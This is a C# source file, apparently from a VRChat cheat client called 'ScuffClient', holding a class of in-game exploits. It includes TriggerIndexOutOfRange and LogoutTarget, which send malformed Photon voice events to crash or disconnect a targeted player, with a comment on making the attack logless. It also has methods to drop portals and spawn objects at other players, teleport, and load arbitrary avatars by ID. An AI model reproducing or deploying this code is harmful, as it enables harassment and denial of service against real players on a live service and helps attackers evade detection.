using System;
using VRC;
using System.Collections.Generic;
using ScuffClient.Photon;
using ScuffClient.Reflections;
using ExitGames.Client.Photon;
using UnityEngine;
using VRC.Core;
using VRCSDK2;
using Player = VRC.Player;
using EventType = ScuffClient.Photon.EventType;

namespace ScuffClient.Misc
{
    public class Exploits
    {
        public static void TriggerIndexOutOfRange(Player p = null)
        {
            //byte array of 0 will trigger index out of range for targetted player
            byte[] data = Functions.ExploitData(true);
            RaiseEventOptions options = new RaiseEventOptions()
            {
                TargetActors = new int[] { p ? Functions.GetPhotonId(p) : Functions.GetPhotonId(PlayerManager.GetPlayer(APIUser.CurrentUser.id)) }
            };

            for(int i = 0; i < 6; i++)
                PhotonSend.RaiseEvent(EventType.SendVoice, data, default(SendOptions), options);
        }

        //4 BOTS REQUIRED (ALT. 4 PLAYERS)
        public static void LogoutTarget(Player p)
        {
            /* mess with index 5,6 and 7 for server time 
             * can make it logless by making resulting num less than 2k
             * but me lazy
             */
            byte[] data = Functions.ExploitData(false);

            RaiseEventOptions options = new RaiseEventOptions()
            {
                TargetActors = new int[] { Functions.GetPhotonId(p) }
            };

            for(int i = 0; i < 6; i++)
                PhotonSend.RaiseEvent(EventType.SendVoice, data, default(SendOptions), options);
        }

        public static void DropPortal(Player target = null)
        {
            Transform t = target ? target.transform : VRCPlayer.Instance.transform;

            GameObject portal = Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "Portals/PortalInternalDynamic", t.position, t.rotation);
            Networking.RPC(VRC_EventHandler.VrcTargetType.AllBufferOne, portal, "ConfigurePortal", new object[]
            {
                //world id
                "wrld_5b89c79e-c340-4510-be1b-476e9fcdedcc",
                //id + world type (private, public etc)
                "~hidden",
                //current users in world
                -666
            });
            /*
             * ty azami for giving me this
             * portal.transform.parent = t;
             * PATCHED
            */

        }

        public static void TriggerWorldObjectEvent(VRC_EventHandler.VrcEvent ev, VRC_EventHandler handler)
        {
            handler.TriggerEvent(ev, VRC_EventHandler.VrcBroadcastType.Always, handler.gameObject);
        }

        public static void Teleport(Player targetPos)
        {
            VRCPlayer.Instance.transform.position = targetPos.transform.position;
        }

        public static void SpawnLamp(Player p = null)
        {
            Transform t = p ? p.transform : VRCPlayer.Instance.transform;
            Networking.Instantiate(VRC_EventHandler.VrcBroadcastType.Always, "CapturePrefabs/DynamicSpot", t.position, t.rotation);
        }

        public static void LoadAvatarFromId(string id)
        {
            //get my actor ID
            int actor = Functions.GetPhotonId(PlayerManager.GetPlayer(APIUser.CurrentUser.id));

            //set avatar ID in keyvaluepair
            List<KeyValuePair<object, object>> kpList = new List<KeyValuePair<object, object>>()
            {
                ActorProperties.SetAvatarId(id),
            };

            PhotonSend.SetProperties(actor, kpList.ToArray());
        }
    }
}
